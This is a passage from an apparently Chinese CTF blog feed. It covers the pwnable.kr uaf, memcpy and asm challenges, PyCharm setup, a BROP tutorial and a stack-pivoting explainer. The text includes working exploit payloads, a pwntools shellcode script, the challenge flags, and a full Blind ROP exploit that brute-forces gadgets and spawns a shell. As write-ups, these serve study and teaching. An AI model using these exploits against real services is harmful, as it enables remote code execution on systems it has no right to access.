&lt;&lt; " years old" &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0; &#125; 题目解析 这道题目很明显是Use-After-Free(UAF)漏洞，case3中delete m;delete w，但是之后再case1中可以再调用m-&gt;introduce();w-&gt;introduce();，触发漏洞。 首先了解下C++虚函数 虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。 调试得到give_shell地址后就需要想办法调用，这里就利用到UAF 但是利用之前需要控制被释放的空间里的内容，case2中有read函数可以利用，但是并不能控制写往什么地址。这里就需要了解下fastbin fastbin顾名思义，fast就是要快。所以fastbin旨在加快操作系统的内存分配速度，fastbin仅使用fd形成单链表的形式，且遵循LIFO原则。 当操作系统分配一块较小的内存时(64字节)，会首先从从fastbin中寻找未使用的chunk并分配。 w，m对象的内存布局为 123456789101112+------------+| vtable |&lt;----------------++------------+ | | age | +------------------++------------+ | human::give_shell|| name | +------------------++------------+ | man::introduce | ^ +------------------+ |+------------+ | &quot;jack&quot; |+------------+ 大小为24字节，属于fastbin。执行delete之后，如果case2中分配的空间大小为24字节，就可以重新分配到这一块内存区域。 payload 123456789101112131415161718192021222324uaf@prowl:~$ python -c 'print "\x48\x15\x40\x00\x00\x00\x00\x00"'&gt;/tmp/uaf_exp1uaf@prowl:~$ ./uaf 24 /tmp/uaf_exp11. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2 #分配两次，因为程序先delete m,后delete w，只分配一次会先分配到w上面，而case1是先执行m-&gt;introduce()。your data is allocated1. use2. after3. free1$ lsflag uaf uaf.cpp$ cat flagyay_f1ag_aft3r_pwning memcpy 题目描述 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121// compiled with : gcc -o memcpy memcpy.c -m32 -lm#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;math.h&gt;unsigned long long rdtsc()&#123; asm("rdtsc");&#125;char* slow_memcpy(char* dest, const char* src, size_t len)&#123; int i; for (i=0; i&lt;len; i++) &#123; dest[i] = src[i]; &#125; return dest;&#125;char* fast_memcpy(char* dest, const char* src, size_t len)&#123; size_t i; // 64-byte block fast copy if(len &gt;= 64)&#123; i = len / 64; len &amp;= (64-1); while(i-- &gt; 0)&#123; __asm__ __volatile__ ( "movdqa (%0), %%xmm0\n" "movdqa 16(%0), %%xmm1\n" "movdqa 32(%0), %%xmm2\n" "movdqa 48(%0), %%xmm3\n" "movntps %%xmm0, (%1)\n" "movntps %%xmm1, 16(%1)\n" "movntps %%xmm2, 32(%1)\n" "movntps %%xmm3, 48(%1)\n" ::"r"(src),"r"(dest):"memory"); dest += 64; src += 64; &#125; &#125; // byte-to-byte slow copy if(len) slow_memcpy(dest, src, len); return dest;&#125;int main(void)&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Hey, I have a boring assignment for CS class.. :(\n"); printf("The assignment is simple.\n"); printf("-----------------------------------------------------\n"); printf("- What is the best implementation of memcpy? -\n"); printf("- 1. implement your own slow/fast version of memcpy -\n"); printf("- 2. compare them with various size of data -\n"); printf("- 3. conclude your experiment and submit report -\n"); printf("-----------------------------------------------------\n"); printf("This time, just help me out with my experiment and get flag\n"); printf("No fancy hacking, I promise :D\n"); unsigned long long t1, t2; int e; char* src; char* dest; unsigned int low, high; unsigned int size; // allocate memory char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); size_t sizes[10]; int i=0; // setup experiment parameters for(e=4; e&lt;14; e++)&#123; // 2^13 = 8K low = pow(2,e-1); high = pow(2,e); printf("specify the memcpy amount between %d ~ %d : ", low, high); scanf("%d", &amp;size); if( size &lt; low || size &gt; high )&#123; printf("don't mess with the experiment.\n"); exit(0); &#125; sizes[i++] = size; &#125; sleep(1); printf("ok, lets run the experiment with your configuration\n"); sleep(1); // run experiment for(i=0; i&lt;10; i++)&#123; size = sizes[i]; printf("experiment %d : memcpy with buffer size %d\n", i+1, size); dest = malloc( size ); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); slow_memcpy(dest, src, size); // byte-to-byte memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1); memcpy(cache1, cache2, 0x4000); // to eliminate cache effect t1 = rdtsc(); fast_memcpy(dest, src, size); // block-to-block memcpy t2 = rdtsc(); printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1); printf("\n"); &#125; printf("thanks for helping my experiment!\n"); printf("flag : ----- erased in this source code -----\n"); return 0;&#125; 题目解析 这个程序的作用就是测试自己实现的两个函数slow_memcpy和fast_memcpy的速度，slow_memcpy使用的是逐字节赋值，fast_memcpy就比较麻烦了，使用的是内嵌汇编movdqa和movntps指令，当程序测试完之后就会直接输出flag。 直接运行程序， 1234567891011121314151617181920212223242526272829specify the memcpy amount between 8 ~ 16 : 8specify the memcpy amount between 16 ~ 32 : 16specify the memcpy amount between 32 ~ 64 : 32specify the memcpy amount between 64 ~ 128 : 64specify the memcpy amount between 128 ~ 256 : 128specify the memcpy amount between 256 ~ 512 : 256specify the memcpy amount between 512 ~ 1024 : 512specify the memcpy amount between 1024 ~ 2048 : 1024specify the memcpy amount between 2048 ~ 4096 : 2048specify the memcpy amount between 4096 ~ 8192 : 4096ok, lets run the experiment with your configurationexperiment 1 : memcpy with buffer size 8ellapsed CPU cycles for slow_memcpy : 2162ellapsed CPU cycles for fast_memcpy : 244experiment 2 : memcpy with buffer size 16ellapsed CPU cycles for slow_memcpy : 358ellapsed CPU cycles for fast_memcpy : 254experiment 3 : memcpy with buffer size 32ellapsed CPU cycles for slow_memcpy : 382ellapsed CPU cycles for fast_memcpy : 484experiment 4 : memcpy with buffer size 64ellapsed CPU cycles for slow_memcpy : 618ellapsed CPU cycles for fast_memcpy : 168experiment 5 : memcpy with buffer size 128ellapsed CPU cycles for slow_memcpy : 1250 并没有输出flag，而是到某一个环节就停下来了，使用ida调试下，程序在_mm_stream_ps(a1, (__m128)_mm_load_si128(a2));，也就是"movntps %%xmm0, (%1)\n"的地方出错了，查了下movntps，其中有一句描述： When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) will be generated. “如果源或目的操作数是一个内存引用，则它必须满足16字节对齐。否则，会造成一般保护错误。” 从源码中可以看到，前三次的赋值操作其实都是由slow_memcpy来完成的，所以没有出问题，那么为什么后面的字节就无法对齐 首先src是通过mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);来得到地址的，这个地址一定是16字节对齐的（原因）。而dest则是由malloc来分配的地址，并且malloc返回的地址总是8字节对齐，所以就有可能导致地址不是16字节对齐。 但是输入的数据为128时，但是程序还是崩溃了 原因在于堆上分配空间时，除了用户的数据，还有4字节的chunk信息，再加上malloc的8字节对齐，所以就无法16字节对齐。 那么接下来输入的数据只需要加上8或者12就可以满足16字节对齐。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364memcpy@prowl:~$ nc 0 9022Hey, I have a boring assignment for CS class.. :(The assignment is simple.------------------------------------------------------ What is the best implementation of memcpy? -- 1. implement your own slow/fast version of memcpy -- 2. compare them with various size of data -- 3. conclude your experiment and submit report ------------------------------------------------------This time, just help me out with my experiment and get flagNo fancy hacking, I promise :Dspecify the memcpy amount between 8 ~ 16 : 8specify the memcpy amount between 16 ~ 32 : 16specify the memcpy amount between 32 ~ 64 : 32specify the memcpy amount between 64 ~ 128 : 72specify the memcpy amount between 128 ~ 256 : 136specify the memcpy amount between 256 ~ 512 : 264specify the memcpy amount between 512 ~ 1024 : 520specify the memcpy amount between 1024 ~ 2048 : 1032specify the memcpy amount between 2048 ~ 4096 : 2056specify the memcpy amount between 4096 ~ 8192 : 4104ok, lets run the experiment with your configurationexperiment 1 : memcpy with buffer size 8ellapsed CPU cycles for slow_memcpy : 2120ellapsed CPU cycles for fast_memcpy : 170experiment 2 : memcpy with buffer size 16ellapsed CPU cycles for slow_memcpy : 234ellapsed CPU cycles for fast_memcpy : 208experiment 3 : memcpy with buffer size 32ellapsed CPU cycles for slow_memcpy : 438ellapsed CPU cycles for fast_memcpy : 340experiment 4 : memcpy with buffer size 72ellapsed CPU cycles for slow_memcpy : 600ellapsed CPU cycles for fast_memcpy : 212experiment 5 : memcpy with buffer size 136ellapsed CPU cycles for slow_memcpy : 1208ellapsed CPU cycles for fast_memcpy : 136experiment 6 : memcpy with buffer size 264ellapsed CPU cycles for slow_memcpy : 1684ellapsed CPU cycles for fast_memcpy : 166experiment 7 : memcpy with buffer size 520ellapsed CPU cycles for slow_memcpy : 3700ellapsed CPU cycles for fast_memcpy : 232experiment 8 : memcpy with buffer size 1032ellapsed CPU cycles for slow_memcpy : 7130ellapsed CPU cycles for fast_memcpy : 400experiment 9 : memcpy with buffer size 2056ellapsed CPU cycles for slow_memcpy : 13596ellapsed CPU cycles for fast_memcpy : 774experiment 10 : memcpy with buffer size 4104ellapsed CPU cycles for slow_memcpy : 29864ellapsed CPU cycles for fast_memcpy : 1486thanks for helping my experiment!flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt asm 题目描述 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#define LENGTH 128void sandbox()&#123; scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); if (ctx == NULL) &#123; printf("seccomp error\n"); exit(0); &#125; seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); if (seccomp_load(ctx) &lt; 0)&#123; seccomp_release(ctx); printf("seccomp error\n"); exit(0); &#125; seccomp_release(ctx);&#125;char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";unsigned char filter[256];int main(int argc, char* argv[])&#123; setvbuf(stdout, 0, _IONBF, 0); setvbuf(stdin, 0, _IOLBF, 0); printf("Welcome to shellcoding practice challenge.\n"); printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"); printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"); printf("If this does not challenge you. you should play 'asg' challenge :)\n"); char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0); memset(sh, 0x90, 0x1000); memcpy(sh, stub, strlen(stub)); int offset = sizeof(stub); printf("give me your x64 shellcode: "); read(0, sh+offset, 1000); alarm(10); chroot("/home/asm_pwn"); // you are in chroot jail. so you can't use symlink in /tmp sandbox(); ((void (*)(void))sh)(); return 0;&#125; 题目解析 首先程序分配一块内存区域，然后用0x90将其填充，接着将stub复制进去。 其中stub的内容利用pwntools的asm模块翻译过来就是清空所有寄存器 12345678910111213141516171819202122232425262728293031&gt;&gt;&gt; print disasm(&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;) 0: 48 dec eax 1: 31 c0 xor eax,eax 3: 48 dec eax 4: 31 db xor ebx,ebx 6: 48 dec eax 7: 31 c9 xor ecx,ecx 9: 48 dec eax a: 31 d2 xor edx,edx c: 48 dec eax d: 31 f6 xor esi,esi f: 48 dec eax 10: 31 ff xor edi,edi 12: 48 dec eax 13: 31 ed xor ebp,ebp 15: 4d dec ebp 16: 31 c0 xor eax,eax 18: 4d dec ebp 19: 31 c9 xor ecx,ecx 1b: 4d dec ebp 1c: 31 d2 xor edx,edx 1e: 4d dec ebp 1f: 31 db xor ebx,ebx 21: 4d dec ebp 22: 31 e4 xor esp,esp 24: 4d dec ebp 25: 31 ed xor ebp,ebp 27: 4d dec ebp 28: 31 f6 xor esi,esi 2a: 4d dec ebp 2b: 31 ff xor edi,edi 接着读取用户输入的数据到内存中。 重点在这个沙箱函数，通过seccomp建立了一些规则，限制了可以使用的系统调用，只能够使用read、open、write、exit、exit_group。 但有这几个函数就足以构造出shellcode去读取flag，利用pwntools的shellcraft模块和asm模块很轻松就可以完成。 汇编语言函数返回值一般是在eax(rax)中，所以open之后read的fd参数填rax 1234567891011121314151617from pwn import *r=ssh('asm','pwnable.kr',2222,'guest')p=r.connect_remote('localhost',9026)context(arch='amd64', os='linux')payload=""payload=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')payload+=shellcraft.open('rsp',0,0)payload+=shellcraft.read('rax','rsp',100)payload+=shellcraft.write(1,'rsp',100)print p.recvuntil('shellcode: ')p.sendline(asm(payload))print p.recvline() 后来测试了下，也可以直接open打开 1payload+=shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2dl]]></title>
    <url>%2F2019%2F08%2F07%2Fret2dl%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[使用PyCharm打造舒适的pwn环境]]></title>
    <url>%2F2019%2F07%2F29%2Fpycharm%2F</url>
    <content type="text"><![CDATA[前言 弄了一天的vim+xshell，结果还是不尽人意，spacevim要求终端支持真彩色，但是xshell显然⑧行，将enable_guicolors设置为false后才勉强能看。 于是突发奇想，将pycharm通过ssh连接到虚拟机当中的python环境，能不能直接在主机上面写脚本调试，查了下还真有这个功能，不过需要pro版本。 准备工作 PyCharm Pro VMware Workstation 科学上网 配置 主题 File-&gt;Settings..-&gt;Plugins，安装Material Theme UI，接着按照自己喜欢的来配就行 配置SSH Interpreter 安装好PyCharm Pro之后，创建一个项目，创建好之后找到File-&gt;Settings..-&gt;Project: ctf-&gt;Project Interpreter配置python解释器 1564413576995 选择Add..-&gt;SSH Interpreter 1564413654784 将虚拟机的ip地址和用户名填写到相应的地方，然后NEXT。 填写密码 1564413731448 设置解释器路径和文件同步位置，然后FINISH 1564413752526 FINISH之后PyCharm会先进行一次同步，同步python库，并且把一些配置文件什么的给传过去，时间略长。 PyCharm的同步还有版本对比功能 1564414108066 不得不说比预想中还要好用。 配置hexo File-&gt;Settings..-&gt;Tools-&gt;Terminal中可以设置PyCharm的终端 将Start directory设置为hexo根目录 shell path可以直接填写终端名称，例如powershell.exe Tab name，标签名称，随便修改。 1564414405852 这样就可以随时进行hexo的相关操作了。 配置SSH Terminal File-&gt;Settings..-&gt;Tools-&gt;SSH Terminal 1564414758329 Deloyment server中选择root@xxx.xxx.xxx.xxx:22 这样每次打开就不需要再选一次了。 FAQ PyCharm中进行调试后，console中输出□= 应该是PyCharm的问题，有两种解决办法： Run-&gt;Edit Configurations..-&gt;Templates-&gt;Python-&gt;Enviroment variables中添加环境变量 1PWNLIB_NOTERM=True 修改/usr/local/lib/python2.7/dist-packages/pwnlib/args.py最后一行，注释掉term.init() 总结 pro版本还是好用，配置好之后，直接在一个窗口中进行所有操作，不需要几个窗口之间来回切了，方便了不少。]]></content>
      <tags>
        <tag>IDE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BROP(Blind ROP)]]></title>
    <url>%2F2019%2F07%2F28%2FBROP%2F</url>
    <content type="text"><![CDATA[BROP 原理 BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流 攻击条件 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。 基本思路 通过暴力枚举判断栈的长度 有Canary的话，爆破Canary 寻找stop_gadget，所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。 获取brop_gadget，通过构造栈的布局来寻找可用的gadget。 寻找puts@plt 寻找puts@got 构造payload 例题：HCTF2016 出题人失踪了 获取stack size 12345678910111213141516def get_buffer_size(): for i in range(100): payload = "A" payload += "A"*i buf_size = len(payload) - 1 try: p = remote('127.0.0.1', 10001) p.recvline() p.send(payload) p.recv() p.close() log.info("bad: %d" % buf_size) except EOFError as e: p.close() log.info("buffer size: %d" % buf_size) return buf_size 计算出[*] buffer size:72 获取stop gadget 123456789101112131415161718192021def get_stop_addr(buf_size): addr = 0x400000 while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("stop address: 0x%x" % addr) return addr except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1 得到[*] stop gadget:4005e5 获取common gadget 找到一些能控制输出函数参数的gadgets，例如pop rdi; retn之类的，因为程序是64位，所以可以来找通用gadget。 12345678910111213141516171819202122232425262728293031323334353637def get_gadgets_addr(buf_size, stop_addr): addr = stop_addr while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(addr) payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("find address: 0x%x" % addr) try: # check payload = "A"*buf_size payload += p64(addr) payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("bad address: 0x%x" % addr) except: p.close() log.info("gadget address: 0x%x" % addr) return addr except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1 得到通用gadget后，gadget address+9即是pop rdi; retn的地址。 获取puts@plt地址 12345678910111213141516171819202122232425262728def get_puts_plt(buf_size, stop_addr, gadgets_addr): pop_rdi = gadgets_addr + 9 # pop rdi; ret; addr = stop_addr while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(pop_rdi) payload += p64(0x400000) payload += p64(addr) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) if p.recv().startswith("\x7fELF"): log.info("puts@plt address: 0x%x" % addr) p.close() return addr log.info("bad: 0x%x" % addr) p.close() except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1 dump文件 12345678910111213141516171819202122232425262728def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr): pop_rdi = gadgets_addr + 9 # pop rdi; ret result = "" while start_addr &lt; end_addr: #print result.encode('hex') sleep(0.1) payload = "A"*buf_size payload += p64(pop_rdi) payload += p64(start_addr) payload += p64(puts_plt) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) data = p.recv(timeout=0.1) # timeout makes sure to recive all bytes if data == "\n": data = "\x00" elif data[-1] == "\n": data = data[:-1] log.info("leaking: 0x%x --&gt; %s" % (start_addr,(data or '').encode('hex'))) result += data start_addr += len(data) p.close() except: log.info("Can't connect") return result 获取puts@got地址 dump下来文件后，使用radare2打开进行分析 123456789101112131415[0x00400630]&gt; pd 14 @ 0x4005e7 :::: 0x004005e7 25240a2000 and eax, 0x200a24 :::: 0x004005ec 0f1f4000 nop dword [rax] :::: 0x004005f0 ff25220a2000 jmp qword [0x00601018] ; [0x601018:8]=-1 :::: 0x004005f6 6800000000 push 0 `====&lt; 0x004005fb e9e0ffffff jmp 0x4005e0 ::: 0x00400600 ff251a0a2000 jmp qword [0x00601020] ; [0x601020:8]=-1 ::: 0x00400606 6801000000 push 1 ; 1 `===&lt; 0x0040060b e9d0ffffff jmp 0x4005e0 :: 0x00400610 ff25120a2000 jmp qword [0x00601028] ; [0x601028:8]=-1 :: 0x00400616 6802000000 push 2 ; 2 `==&lt; 0x0040061b e9c0ffffff jmp 0x4005e0 : 0x00400620 ff250a0a2000 jmp qword [0x00601030] ; [0x601030:8]=-1 : 0x00400626 6803000000 push 3 ; 3 `=&lt; 0x0040062b e9b0ffffff jmp 0x4005e0 exploit 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217from pwn import *#context.log_level = 'debug'def get_buffer_size(): for i in range(100): payload = "A" payload += "A"*i buf_size = len(payload) - 1 try: p = remote('127.0.0.1', 10001) p.recvline() p.send(payload) p.recv() p.close() log.info("bad: %d" % buf_size) except EOFError as e: p.close() log.info("buffer size: %d" % buf_size) return buf_sizedef get_stop_addr(buf_size): addr = 0x400000 while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("stop address: 0x%x" % addr) return addr except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1def get_gadgets_addr(buf_size, stop_addr): addr = stop_addr while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(addr) payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("find address: 0x%x" % addr) try: # check payload = "A"*buf_size payload += p64(addr) payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6) p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) p.recvline() p.close() log.info("bad address: 0x%x" % addr) except: p.close() log.info("gadget address: 0x%x" % addr) return addr except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1def get_puts_plt(buf_size, stop_addr, gadgets_addr): pop_rdi = gadgets_addr + 9 # pop rdi; ret; addr = stop_addr while True: sleep(0.1) addr += 1 payload = "A"*buf_size payload += p64(pop_rdi) payload += p64(0x400000) payload += p64(addr) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) if p.recv().startswith("\x7fELF"): log.info("puts@plt address: 0x%x" % addr) p.close() return addr log.info("bad: 0x%x" % addr) p.close() except EOFError as e: p.close() log.info("bad: 0x%x" % addr) except: log.info("Can't connect") addr -= 1def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr): pop_rdi = gadgets_addr + 9 # pop rdi; ret result = "" while start_addr &lt; end_addr: #print result.encode('hex') sleep(0.1) payload = "A"*buf_size payload += p64(pop_rdi) payload += p64(start_addr) payload += p64(puts_plt) payload += p64(stop_addr) try: p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) data = p.recv(timeout=0.1) # timeout makes sure to recive all bytes if data == "\n": data = "\x00" elif data[-1] == "\n": data = data[:-1] log.info("leaking: 0x%x --&gt; %s" % (start_addr,(data or '').encode('hex'))) result += data start_addr += len(data) p.close() except: log.info("Can't connect") return resultdef get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got): pop_rdi = gadgets_addr + 9 payload = "A"*buf_size payload += p64(pop_rdi) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(stop_addr) p = remote('127.0.0.1', 10001) p.recvline() p.sendline(payload) data = p.recvline() data = u64(data[:-1] + '\x00\x00') log.info("puts address: 0x%x" % data) p.close() return data#buf_size = get_buffer_size()buf_size = 72#stop_addr = get_stop_addr(buf_size)stop_addr = 0x4005e5#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)gadgets_addr = 0x40082a#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)puts_plt = 0x4005e7 # fake puts#puts_plt = 0x4005f0 # true puts# dump code section from memory# and then use Radare2 or IDA Pro to find the got address#start_addr = 0x400000#end_addr = 0x401000#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)#with open('code.bin', 'wb') as f:# f.write(code_bin)# f.close()puts_got = 0x00601018# you can also dump data from memory and get information from .got#start_addr = 0x600000#end_addr = 0x602000#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)#with open('data.bin', 'wb') as f:# f.write(data_bin)# f.close()# must close ASLR#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)puts_addr = 0x7ffff7a90210# first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so# $ ./find puts 0x7ffff7a90210# or $ ./find puts 210# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts# then you can get the following offsetoffset_puts = 0x000000000006f210offset_system = 0x0000000000042010offset_str_bin_sh = 0x17aff5system_addr = (puts_addr - offset_puts) + offset_systembinsh_addr = (puts_addr - offset_puts) + offset_str_bin_sh# get shellpayload = "A"*buf_sizepayload += p64(gadgets_addr + 9) # pop rdi; ret;payload += p64(binsh_addr)payload += p64(system_addr)payload += p64(stop_addr)p = remote('127.0.0.1', 10001)p.recvline()p.sendline(payload)p.interactive() 总结 思路是这么个思路，但是不管怎么做，怎么改payload，就是达不到预期效果，甚至光网上的wp不同的stop gadget和common gadget都有三种，可能还是系统版本问题。]]></content>
  </entry>
  <entry>
    <title><![CDATA[栈迁移的相关操作]]></title>
    <url>%2F2019%2F07%2F28%2Fframe-faking%2F</url>
    <content type="text"><![CDATA[frame faking 原理 通过覆盖栈上的数据来控制EBP的值，进而控制ESP的值。 构造payload： buffer padding fake EBP leave_retn 其中leave retn就相当于 123leave ;mov esp, ebp # 将ebp的值赋给esp ;pop ebp # 弹出ebpretn ;pop eip #弹出eip 函数的返回地址被覆盖为leave retn，也就是说程序执行完自己的leave retn之后，还会再执行一次leave retn。其中fake EBP是新栈帧的地址。 流程如下： 在有栈溢出的程序执行 leave 时，其分为两个步骤 mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。 pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp 便指向了 ebp2，也就是保存了 ebp2 所在的地址。 执行 ret 指令，会再次执行 leave ret 指令。 执行 leave 指令，其分为两个步骤 mov esp, ebp ，这会将 esp 指向 ebp2。 pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。 执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行 push ebp，会将 ebp2 值压入栈中， mov ebp, esp，将 ebp 指向当前基地址。]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA总结]]></title>
    <url>%2F2019%2F07%2F10%2Frsa%2F</url>
